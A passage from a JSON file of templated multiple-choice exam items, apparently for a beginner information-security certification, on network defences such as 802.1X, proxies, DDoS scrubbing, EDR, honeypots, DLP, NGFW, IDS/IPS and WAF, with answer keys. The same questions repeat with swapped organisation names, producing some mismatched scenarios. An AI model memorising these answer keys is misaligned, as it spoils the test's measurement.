    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某知名大型網路電商平台為防範外來訪客或外包廠商未經核准之個人筆電隨意插入辦公室實體網路孔存取內網，企業應在區域網路交換器上導入何種網路存取控制標準？",
    "options": [
      "A. 允許所有人免認證使用",
      "B. 802.1X 網路接取控制（NAC, Network Access Control）",
      "C. 改用家用集線器",
      "D. 停用所有交換器電源"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "802.1X 搭配 RADIUS 伺服器，可在端點網線插上交換器時強制進行身分認證與健康度檢查，未通過者直接劃入隔離 VLAN。",
    "trap": "能有效防止外來未授權設備私接內網（Rogue Device）。",
    "law": "IEEE 802.1X 標準"
  },
  {
    "id": "IPAS-B-616",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某國際航運物流貨櫃集團規劃於內部網路邊界部署代理伺服器（Proxy），用以統一管制全公司同仁上網行為、過濾惡意釣魚網址並快取網頁以節省外網頻寬。此種代理伺服器型態屬於：",
    "options": [
      "A. 正向代理（Forward Proxy，代理內部用戶端向外網伺服器發起存取）",
      "B. 入侵防禦系統",
      "C. 反向代理（Reverse Proxy）",
      "D. 蜜罐系統"
    ],
    "answer": "A",
    "terms": [],
    "explanation": "Forward Proxy 位於用戶端前端，代表用戶端向外部網站請求，具備集中上網稽核、網址過濾與快取功能；Reverse Proxy 則是為後端伺服器擋在前端。",
    "trap": "口訣：保護內部訪客向外上網是正向代理；保護後台伺服器對外提供服務是反向代理。",
    "law": "RFC 7230"
  },
  {
    "id": "IPAS-B-617",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某金流與行動支付科技公司在舉辦週年慶促銷活動期間，官方電商網站突遭超過 300 Gbps 的巨量反射放大攻擊（DNS/NTP Amplification DDoS）導致對外頻寬瞬間塞爆癱瘓。此時內部自建防火牆已完全無法承受，最適當之應變處置為：",
    "options": [
      "A. 立即將對外 DNS 解析切換至雲端抗 DDoS 流量清洗服務（Scrubbing Center）或 CDN",
      "B. 將伺服器網線拔除",
      "C. 重啟內部路由器",
      "D. 在內部防火牆手動逐筆封鎖 IP"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "DDoS",
        "zh": "分散式阻斷服務攻擊",
        "ipa": "/ˌdiːˈdɑːs/"
      },
      {
        "en": "NTP",
        "zh": "網路時間協定",
        "ipa": "/ˌen.tiːˈpiː/"
      }
    ],
    "explanation": "當流量超過實體線路頻寬（Pipe Saturation）時，在地端做任何阻擋皆無效（水管已被塞滿），必須由雲端流量清洗中心在大骨幹網將惡意流量清洗過濾後再回傳乾淨流量。",
    "trap": "單純在本地端防火牆封鎖 IP 無法解決頻寬被塞爆的問題。",
    "law": "CISA DDoS 緩解指南"
  },
  {
    "id": "IPAS-B-618",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某關鍵基礎設施發電廠傳統防毒軟體每日更新病毒特徵碼，但某日仍遭到全新變種勒索軟體穿透。資安顧問指出傳統防毒軟體難以防禦零日攻擊（Zero-day），建議導入結合機器學習與行為啟發之何種技術？",
    "options": [
      "A. 停用 Windows 內建防火牆",
      "B. 次世代防毒（NGAV）與端點行為監控（EDR）",
      "C. 增加硬碟儲存容量",
      "D. 移除所有防毒軟體"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "EDR",
        "zh": "端點偵測與回應",
        "ipa": "/ˌiː.diːˈɑːr/"
      }
    ],
    "explanation": "傳統特徵碼防毒對未知的 Zero-day 無法比對出 Hash；NGAV 透過機器學習與行為啟發式分析（如偵測注入、提權、異常連線）可防範未知威脅。",
    "trap": "擺脫對靜態特徵庫的絕對依賴是端點安全的重大演進。",
    "law": "Gartner 端點防護平台報告"
  },
  {
    "id": "IPAS-B-619",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某雲端SaaS軟體服務供應商在內部伺服器網段中部署了一台刻意未打補丁且偽裝成核心資料庫的「蜜罐伺服器（Honeypot）」。若監控系統突然收到該蜜罐伺服器被內部某台 PC 連線之警報，資安分析師應如何判定該警報？",
    "options": [
      "A. 代表蜜罐軟體損壞",
      "B. 該警報具有極高真實性與威脅性，代表內部已有受害或具惡意意圖之主機正在進行內網橫向刺探",
      "C. 判定為系統誤報，直接忽略",
      "D. 代表網路速度過慢"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "蜜罐在正常業務中絕不應有任何人連線存取，任何對蜜罐的觸發皆屬於高度可疑的黑客探測或內部橫向移動行為，誤報率極低。",
    "trap": "蜜罐警報優先級通常設定為極高，需立即介入排查發起端。",
    "law": "SANS 誘捕防禦指南"
  },
  {
    "id": "IPAS-B-620",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某關鍵基礎設施發電廠為落實客戶個人資料外流防護，在電子郵件閘道端啟用了資料外洩防護（DLP）規則。當員工企圖透過郵件將含有身分證字號清單之 Excel 寄給私人信箱時，DLP 主要透過何種技術識別出機敏資料？",
    "options": [
      "A. 僅壓縮電子郵件大小",
      "B. 關鍵字規則與正規表達式（Regular Expression, RegEx）內容識別技術",
      "C. 僅檢查電子郵件主旨長度",
      "D. 檢查寄件時間是否在下班時間"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "DLP 透過深層內容剖析（DPI）搭配正規表達式（比對身分證格式、信用卡 Luhn 演算法校驗碼）與資料特徵指紋（Fingerprinting），精準識別機敏文件。",
    "trap": "單純看副檔名無法防範員工將機敏資料複製到純文字檔外傳。",
    "law": "ISO/IEC 27001 A.8.12 DLP 控制"
  },
  {
    "id": "IPAS-B-621",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某國立頂尖研究型大學內部網路頻繁遭受駭客將惡意命令隱藏於標準 HTTPS（Port 443）流量中外傳機密。傳統 Layer 4 狀態檢查防火牆因 Port 443 開放而全數放行。企業最應導入何種邊界設備以落實第 7 層應用程式內容與 SSL 解密檢驗？",
    "options": [
      "A. 無線基地台（AP）",
      "B. 次世代防火牆（NGFW，具備 Layer 7 深度封包檢測 DPI 與 SSL/TLS 解密能力）",
      "C. 傳統 Layer 3 靜態封包過濾路由器",
      "D. 集線器（Hub）"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "TLS",
        "zh": "傳輸層安全性協定",
        "ipa": "/ˌtiː.elˈes/"
      },
      {
        "en": "NGFW",
        "zh": "次世代防火牆",
        "ipa": "/ˌen.dʒiː.efˈdʌb.əl.juː/"
      }
    ],
    "explanation": "NGFW 具備第 7 層深度封包檢驗與 SSL 解密檢驗能力，即使在 443 連接埠中亦能識別具體應用程式與隱蔽惡意負載。",
    "trap": "傳統防火牆僅檢查 Port 443 放行，無法察覺加密封包內的惡意內容。",
    "law": "Gartner NGFW 定義標準"
  },
  {
    "id": "IPAS-B-622",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某高科技晶圓代工大廠規劃於核心交換機旁部署一套入侵偵測系統（IDS），網管人員使用交換機的連接埠鏡像（Port Mirroring / SPAN）將流量複製一份送入 IDS。此種部署方式的致命限制為何？",
    "options": [
      "A. 採旁路監控（Out-of-band）只能被動發出告警，無法在封包到達目標前即時攔截阻斷",
      "B. 伺服器會立即斷線崩潰",
      "C. 無法分析任何網路封包",
      "D. 會導致交換機網路速度降低 99%"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "IDS",
        "zh": "入侵偵測系統 (旁路監控)",
        "ipa": "/ˌaɪ.diːˈes/"
      }
    ],
    "explanation": "IDS 透過 Mirror Port 接收複製流量，封包此時早已送達目的地，因此 IDS 只能事後告警，完全無法即時阻斷連線。",
    "trap": "需要即時阻斷者必須採用 Inline 串聯部署之 IPS。",
    "law": "NIST SP 800-94"
  },
  {
    "id": "IPAS-B-623",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某直轄市政府智慧運籌中心為防止外部勒索軟體的漏洞利用攻擊封包進入內部伺服器，資安主管要求資安設備必須具備「在攻擊封包到達受害伺服器前，立即予以主動丟棄阻斷（Drop Packet）」之能力。該設備必須採何種架構部署？",
    "options": [
      "A. 關閉所有網路交換機",
      "B. 僅使用本機記事本記錄",
      "C. 採用 Inline（串聯）方式部署於網路通訊核心路徑上之 IPS",
      "D. 採用旁路監聽方式部署之網路分析儀"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "IPS",
        "zh": "入侵防禦系統 (串聯阻斷)",
        "ipa": "/ˌaɪ.piːˈes/"
      }
    ],
    "explanation": "IPS 必須以 Inline（串聯）方式像守門員一樣跨接在線路上，所有封包流經 IPS 本體檢驗，確認惡意立即執行 Drop 阻斷。",
    "trap": "串聯部署若設備故障需具備 Hardware Bypass 機制以確保網路不斷線。",
    "law": "NIST SP 800-94"
  },
  {
    "id": "IPAS-B-624",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某知名大型網路電商平台對外提供之線上購物網站近期頻繁遭受 SQL 注入與跨網站腳本（XSS）攻擊。若要在不改動應用程式原始碼之前提下迅速在網路邊界建立防護，應優先在 Web 伺服器前端部署：",
    "options": [
      "A. 傳統 Layer 3 網路防火牆",
      "B. 網站應用程式防火牆（WAF, Web Application Firewall）",
      "C. 本機防毒軟體",
      "D. 磁帶備份機"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "XSS",
        "zh": "跨網站腳本攻擊",
        "ipa": "/ˌeks.esˈes/"
      },
      {
        "en": "WAF",
        "zh": "網站應用程式防火牆",
        "ipa": "/wæf/"
      }
    ],
    "explanation": "WAF 專為 HTTP/HTTPS 打造，能深入剖析 URL、Header、Cookie 與 POST Body，阻絕 SQLi、XSS、WebShell 等 Web 應用漏洞。",
    "trap": "一般網路防火牆無法理解 HTTP 語意與 SQL 注入語法。",
    "law": "PCI DSS 要求 6.6"
  },
  {
    "id": "IPAS-B-625",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某金流與行動支付科技公司為防範外來訪客或外包廠商未經核准之個人筆電隨意插入辦公室實體網路孔存取內網，企業應在區域網路交換器上導入何種網路存取控制標準？",
    "options": [
      "A. 802.1X 網路接取控制（NAC, Network Access Control）",
      "B. 改用家用集線器",
      "C. 停用所有交換器電源",
      "D. 允許所有人免認證使用"
    ],
    "answer": "A",
    "terms": [],
    "explanation": "802.1X 搭配 RADIUS 伺服器，可在端點網線插上交換器時強制進行身分認證與健康度檢查，未通過者直接劃入隔離 VLAN。",
    "trap": "能有效防止外來未授權設備私接內網（Rogue Device）。",
    "law": "IEEE 802.1X 標準"
  },
  {
    "id": "IPAS-B-626",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某雲端SaaS軟體服務供應商規劃於內部網路邊界部署代理伺服器（Proxy），用以統一管制全公司同仁上網行為、過濾惡意釣魚網址並快取網頁以節省外網頻寬。此種代理伺服器型態屬於：",
    "options": [
      "A. 蜜罐系統",
      "B. 正向代理（Forward Proxy，代理內部用戶端向外網伺服器發起存取）",
      "C. 反向代理（Reverse Proxy）",
      "D. 入侵防禦系統"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "Forward Proxy 位於用戶端前端，代表用戶端向外部網站請求，具備集中上網稽核、網址過濾與快取功能；Reverse Proxy 則是為後端伺服器擋在前端。",
    "trap": "口訣：保護內部訪客向外上網是正向代理；保護後台伺服器對外提供服務是反向代理。",
    "law": "RFC 7230"
  },
  {
    "id": "IPAS-B-627",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某雲端SaaS軟體服務供應商在舉辦週年慶促銷活動期間，官方電商網站突遭超過 300 Gbps 的巨量反射放大攻擊（DNS/NTP Amplification DDoS）導致對外頻寬瞬間塞爆癱瘓。此時內部自建防火牆已完全無法承受，最適當之應變處置為：",
    "options": [
      "A. 重啟內部路由器",
      "B. 將伺服器網線拔除",
      "C. 立即將對外 DNS 解析切換至雲端抗 DDoS 流量清洗服務（Scrubbing Center）或 CDN",
      "D. 在內部防火牆手動逐筆封鎖 IP"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "DDoS",
        "zh": "分散式阻斷服務攻擊",
        "ipa": "/ˌdiːˈdɑːs/"
      },
      {
        "en": "NTP",
        "zh": "網路時間協定",
        "ipa": "/ˌen.tiːˈpiː/"
      }
    ],
    "explanation": "當流量超過實體線路頻寬（Pipe Saturation）時，在地端做任何阻擋皆無效（水管已被塞滿），必須由雲端流量清洗中心在大骨幹網將惡意流量清洗過濾後再回傳乾淨流量。",
    "trap": "單純在本地端防火牆封鎖 IP 無法解決頻寬被塞爆的問題。",
    "law": "CISA DDoS 緩解指南"
  },
  {
    "id": "IPAS-B-628",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某雲端SaaS軟體服務供應商傳統防毒軟體每日更新病毒特徵碼，但某日仍遭到全新變種勒索軟體穿透。資安顧問指出傳統防毒軟體難以防禦零日攻擊（Zero-day），建議導入結合機器學習與行為啟發之何種技術？",
    "options": [
      "A. 增加硬碟儲存容量",
      "B. 停用 Windows 內建防火牆",
      "C. 次世代防毒（NGAV）與端點行為監控（EDR）",
      "D. 移除所有防毒軟體"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "EDR",
        "zh": "端點偵測與回應",
        "ipa": "/ˌiː.diːˈɑːr/"
      }
    ],
    "explanation": "傳統特徵碼防毒對未知的 Zero-day 無法比對出 Hash；NGAV 透過機器學習與行為啟發式分析（如偵測注入、提權、異常連線）可防範未知威脅。",
    "trap": "擺脫對靜態特徵庫的絕對依賴是端點安全的重大演進。",
    "law": "Gartner 端點防護平台報告"
  },
  {
    "id": "IPAS-B-629",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某國際航運物流貨櫃集團在內部伺服器網段中部署了一台刻意未打補丁且偽裝成核心資料庫的「蜜罐伺服器（Honeypot）」。若監控系統突然收到該蜜罐伺服器被內部某台 PC 連線之警報，資安分析師應如何判定該警報？",
    "options": [
      "A. 判定為系統誤報，直接忽略",
      "B. 代表蜜罐軟體損壞",
      "C. 代表網路速度過慢",
      "D. 該警報具有極高真實性與威脅性，代表內部已有受害或具惡意意圖之主機正在進行內網橫向刺探"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "蜜罐在正常業務中絕不應有任何人連線存取，任何對蜜罐的觸發皆屬於高度可疑的黑客探測或內部橫向移動行為，誤報率極低。",
    "trap": "蜜罐警報優先級通常設定為極高，需立即介入排查發起端。",
    "law": "SANS 誘捕防禦指南"
  },
  {
    "id": "IPAS-B-630",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某高科技晶圓代工大廠為落實客戶個人資料外流防護，在電子郵件閘道端啟用了資料外洩防護（DLP）規則。當員工企圖透過郵件將含有身分證字號清單之 Excel 寄給私人信箱時，DLP 主要透過何種技術識別出機敏資料？",
    "options": [
      "A. 僅檢查電子郵件主旨長度",
      "B. 檢查寄件時間是否在下班時間",
      "C. 關鍵字規則與正規表達式（Regular Expression, RegEx）內容識別技術",
      "D. 僅壓縮電子郵件大小"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "DLP 透過深層內容剖析（DPI）搭配正規表達式（比對身分證格式、信用卡 Luhn 演算法校驗碼）與資料特徵指紋（Fingerprinting），精準識別機敏文件。",
    "trap": "單純看副檔名無法防範員工將機敏資料複製到純文字檔外傳。",
    "law": "ISO/IEC 27001 A.8.12 DLP 控制"
  },
  {
    "id": "IPAS-B-631",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某跨國金融控股銀行內部網路頻繁遭受駭客將惡意命令隱藏於標準 HTTPS（Port 443）流量中外傳機密。傳統 Layer 4 狀態檢查防火牆因 Port 443 開放而全數放行。企業最應導入何種邊界設備以落實第 7 層應用程式內容與 SSL 解密檢驗？",
    "options": [
      "A. 無線基地台（AP）",
      "B. 傳統 Layer 3 靜態封包過濾路由器",
      "C. 次世代防火牆（NGFW，具備 Layer 7 深度封包檢測 DPI 與 SSL/TLS 解密能力）",
      "D. 集線器（Hub）"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "TLS",
        "zh": "傳輸層安全性協定",
        "ipa": "/ˌtiː.elˈes/"
      },
      {
        "en": "NGFW",
        "zh": "次世代防火牆",
        "ipa": "/ˌen.dʒiː.efˈdʌb.əl.juː/"
      }
    ],
    "explanation": "NGFW 具備第 7 層深度封包檢驗與 SSL 解密檢驗能力，即使在 443 連接埠中亦能識別具體應用程式與隱蔽惡意負載。",
    "trap": "傳統防火牆僅檢查 Port 443 放行，無法察覺加密封包內的惡意內容。",
    "law": "Gartner NGFW 定義標準"
  },
  {
    "id": "IPAS-B-632",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某國際航運物流貨櫃集團規劃於核心交換機旁部署一套入侵偵測系統（IDS），網管人員使用交換機的連接埠鏡像（Port Mirroring / SPAN）將流量複製一份送入 IDS。此種部署方式的致命限制為何？",
    "options": [
      "A. 會導致交換機網路速度降低 99%",
      "B. 採旁路監控（Out-of-band）只能被動發出告警，無法在封包到達目標前即時攔截阻斷",
      "C. 伺服器會立即斷線崩潰",
      "D. 無法分析任何網路封包"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "IDS",
        "zh": "入侵偵測系統 (旁路監控)",
        "ipa": "/ˌaɪ.diːˈes/"
      }
    ],
    "explanation": "IDS 透過 Mirror Port 接收複製流量，封包此時早已送達目的地，因此 IDS 只能事後告警，完全無法即時阻斷連線。",
    "trap": "需要即時阻斷者必須採用 Inline 串聯部署之 IPS。",
    "law": "NIST SP 800-94"
  },
  {
    "id": "IPAS-B-633",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某國立頂尖研究型大學為防止外部勒索軟體的漏洞利用攻擊封包進入內部伺服器，資安主管要求資安設備必須具備「在攻擊封包到達受害伺服器前，立即予以主動丟棄阻斷（Drop Packet）」之能力。該設備必須採何種架構部署？",
    "options": [
      "A. 採用 Inline（串聯）方式部署於網路通訊核心路徑上之 IPS",
      "B. 採用旁路監聽方式部署之網路分析儀",
      "C. 關閉所有網路交換機",
      "D. 僅使用本機記事本記錄"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "IPS",
        "zh": "入侵防禦系統 (串聯阻斷)",
        "ipa": "/ˌaɪ.piːˈes/"
      }
    ],
    "explanation": "IPS 必須以 Inline（串聯）方式像守門員一樣跨接在線路上，所有封包流經 IPS 本體檢驗，確認惡意立即執行 Drop 阻斷。",
    "trap": "串聯部署若設備故障需具備 Hardware Bypass 機制以確保網路不斷線。",
    "law": "NIST SP 800-94"
  },
  {
    "id": "IPAS-B-634",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某高科技晶圓代工大廠對外提供之線上購物網站近期頻繁遭受 SQL 注入與跨網站腳本（XSS）攻擊。若要在不改動應用程式原始碼之前提下迅速在網路邊界建立防護，應優先在 Web 伺服器前端部署：",
    "options": [
      "A. 磁帶備份機",
      "B. 傳統 Layer 3 網路防火牆",
      "C. 本機防毒軟體",
      "D. 網站應用程式防火牆（WAF, Web Application Firewall）"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "XSS",
        "zh": "跨網站腳本攻擊",
        "ipa": "/ˌeks.esˈes/"
      },
      {
        "en": "WAF",
        "zh": "網站應用程式防火牆",
        "ipa": "/wæf/"
      }
    ],
    "explanation": "WAF 專為 HTTP/HTTPS 打造，能深入剖析 URL、Header、Cookie 與 POST Body，阻絕 SQLi、XSS、WebShell 等 Web 應用漏洞。",
    "trap": "一般網路防火牆無法理解 HTTP 語意與 SQL 注入語法。",
    "law": "PCI DSS 要求 6.6"
  },
  {
    "id": "IPAS-B-635",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某高科技晶圓代工大廠為防範外來訪客或外包廠商未經核准之個人筆電隨意插入辦公室實體網路孔存取內網，企業應在區域網路交換器上導入何種網路存取控制標準？",
    "options": [
      "A. 改用家用集線器",
      "B. 停用所有交換器電源",
      "C. 允許所有人免認證使用",
      "D. 802.1X 網路接取控制（NAC, Network Access Control）"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "802.1X 搭配 RADIUS 伺服器，可在端點網線插上交換器時強制進行身分認證與健康度檢查，未通過者直接劃入隔離 VLAN。",
    "trap": "能有效防止外來未授權設備私接內網（Rogue Device）。",
    "law": "IEEE 802.1X 標準"
  },
  {
    "id": "IPAS-B-636",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某國際航運物流貨櫃集團規劃於內部網路邊界部署代理伺服器（Proxy），用以統一管制全公司同仁上網行為、過濾惡意釣魚網址並快取網頁以節省外網頻寬。此種代理伺服器型態屬於：",
    "options": [
      "A. 入侵防禦系統",
      "B. 反向代理（Reverse Proxy）",
      "C. 正向代理（Forward Proxy，代理內部用戶端向外網伺服器發起存取）",
      "D. 蜜罐系統"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "Forward Proxy 位於用戶端前端，代表用戶端向外部網站請求，具備集中上網稽核、網址過濾與快取功能；Reverse Proxy 則是為後端伺服器擋在前端。",
    "trap": "口訣：保護內部訪客向外上網是正向代理；保護後台伺服器對外提供服務是反向代理。",
    "law": "RFC 7230"
  },
  {
    "id": "IPAS-B-637",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某區域教學醫學中心在舉辦週年慶促銷活動期間，官方電商網站突遭超過 300 Gbps 的巨量反射放大攻擊（DNS/NTP Amplification DDoS）導致對外頻寬瞬間塞爆癱瘓。此時內部自建防火牆已完全無法承受，最適當之應變處置為：",
    "options": [
      "A. 重啟內部路由器",
      "B. 在內部防火牆手動逐筆封鎖 IP",
      "C. 將伺服器網線拔除",
      "D. 立即將對外 DNS 解析切換至雲端抗 DDoS 流量清洗服務（Scrubbing Center）或 CDN"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "DDoS",
        "zh": "分散式阻斷服務攻擊",
        "ipa": "/ˌdiːˈdɑːs/"
      },
      {
        "en": "NTP",
        "zh": "網路時間協定",
        "ipa": "/ˌen.tiːˈpiː/"
      }
    ],
    "explanation": "當流量超過實體線路頻寬（Pipe Saturation）時，在地端做任何阻擋皆無效（水管已被塞滿），必須由雲端流量清洗中心在大骨幹網將惡意流量清洗過濾後再回傳乾淨流量。",
    "trap": "單純在本地端防火牆封鎖 IP 無法解決頻寬被塞爆的問題。",
    "law": "CISA DDoS 緩解指南"
  },
  {
    "id": "IPAS-B-638",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某知名大型網路電商平台傳統防毒軟體每日更新病毒特徵碼，但某日仍遭到全新變種勒索軟體穿透。資安顧問指出傳統防毒軟體難以防禦零日攻擊（Zero-day），建議導入結合機器學習與行為啟發之何種技術？",
    "options": [
      "A. 次世代防毒（NGAV）與端點行為監控（EDR）",
      "B. 移除所有防毒軟體",
      "C. 停用 Windows 內建防火牆",
      "D. 增加硬碟儲存容量"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "EDR",
        "zh": "端點偵測與回應",
        "ipa": "/ˌiː.diːˈɑːr/"
      }
    ],
    "explanation": "傳統特徵碼防毒對未知的 Zero-day 無法比對出 Hash；NGAV 透過機器學習與行為啟發式分析（如偵測注入、提權、異常連線）可防範未知威脅。",
    "trap": "擺脫對靜態特徵庫的絕對依賴是端點安全的重大演進。",
    "law": "Gartner 端點防護平台報告"
  },
  {
    "id": "IPAS-B-639",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某關鍵基礎設施發電廠在內部伺服器網段中部署了一台刻意未打補丁且偽裝成核心資料庫的「蜜罐伺服器（Honeypot）」。若監控系統突然收到該蜜罐伺服器被內部某台 PC 連線之警報，資安分析師應如何判定該警報？",
    "options": [
      "A. 代表網路速度過慢",
      "B. 該警報具有極高真實性與威脅性，代表內部已有受害或具惡意意圖之主機正在進行內網橫向刺探",
      "C. 判定為系統誤報，直接忽略",
      "D. 代表蜜罐軟體損壞"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "蜜罐在正常業務中絕不應有任何人連線存取，任何對蜜罐的觸發皆屬於高度可疑的黑客探測或內部橫向移動行為，誤報率極低。",
    "trap": "蜜罐警報優先級通常設定為極高，需立即介入排查發起端。",
    "law": "SANS 誘捕防禦指南"
  },
  {
    "id": "IPAS-B-640",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某關鍵基礎設施發電廠為落實客戶個人資料外流防護，在電子郵件閘道端啟用了資料外洩防護（DLP）規則。當員工企圖透過郵件將含有身分證字號清單之 Excel 寄給私人信箱時，DLP 主要透過何種技術識別出機敏資料？",
    "options": [
      "A. 檢查寄件時間是否在下班時間",
      "B. 關鍵字規則與正規表達式（Regular Expression, RegEx）內容識別技術",
      "C. 僅檢查電子郵件主旨長度",
      "D. 僅壓縮電子郵件大小"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "DLP 透過深層內容剖析（DPI）搭配正規表達式（比對身分證格式、信用卡 Luhn 演算法校驗碼）與資料特徵指紋（Fingerprinting），精準識別機敏文件。",
    "trap": "單純看副檔名無法防範員工將機敏資料複製到純文字檔外傳。",
    "law": "ISO/IEC 27001 A.8.12 DLP 控制"
  },
  {
    "id": "IPAS-B-641",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某雲端SaaS軟體服務供應商內部網路頻繁遭受駭客將惡意命令隱藏於標準 HTTPS（Port 443）流量中外傳機密。傳統 Layer 4 狀態檢查防火牆因 Port 443 開放而全數放行。企業最應導入何種邊界設備以落實第 7 層應用程式內容與 SSL 解密檢驗？",
    "options": [
      "A. 傳統 Layer 3 靜態封包過濾路由器",
      "B. 次世代防火牆（NGFW，具備 Layer 7 深度封包檢測 DPI 與 SSL/TLS 解密能力）",
      "C. 無線基地台（AP）",
      "D. 集線器（Hub）"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "TLS",
        "zh": "傳輸層安全性協定",
        "ipa": "/ˌtiː.elˈes/"
      },
      {
        "en": "NGFW",
        "zh": "次世代防火牆",
        "ipa": "/ˌen.dʒiː.efˈdʌb.əl.juː/"
      }
    ],
    "explanation": "NGFW 具備第 7 層深度封包檢驗與 SSL 解密檢驗能力，即使在 443 連接埠中亦能識別具體應用程式與隱蔽惡意負載。",
    "trap": "傳統防火牆僅檢查 Port 443 放行，無法察覺加密封包內的惡意內容。",
    "law": "Gartner NGFW 定義標準"
  },
  {
    "id": "IPAS-B-642",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
    "question": "某公務機關資訊處規劃於核心交換機旁部署一套入侵偵測系統（IDS），網管人員使用交換機的連接埠鏡像（Port Mirroring / SPAN）將流量複製一份送入 IDS。此種部署方式的致命限制為何？",
    "options": [
      "A. 會導致交換機網路速度降低 99%",
      "B. 伺服器會立即斷線崩潰",
      "C. 無法分析任何網路封包",
      "D. 採旁路監控（Out-of-band）只能被動發出告警，無法在封包到達目標前即時攔截阻斷"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "IDS",
        "zh": "入侵偵測系統 (旁路監控)",
        "ipa": "/ˌaɪ.diːˈes/"
      }
    ],
    "explanation": "IDS 透過 Mirror Port 接收複製流量，封包此時早已送達目的地，因此 IDS 只能事後告警，完全無法即時阻斷連線。",
    "trap": "需要即時阻斷者必須採用 Inline 串聯部署之 IPS。",
    "law": "NIST SP 800-94"
  },
  {
    "id": "IPAS-B-643",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "網路防護設備、次世代防火牆與 IDS/IPS",
    "scenario": true,
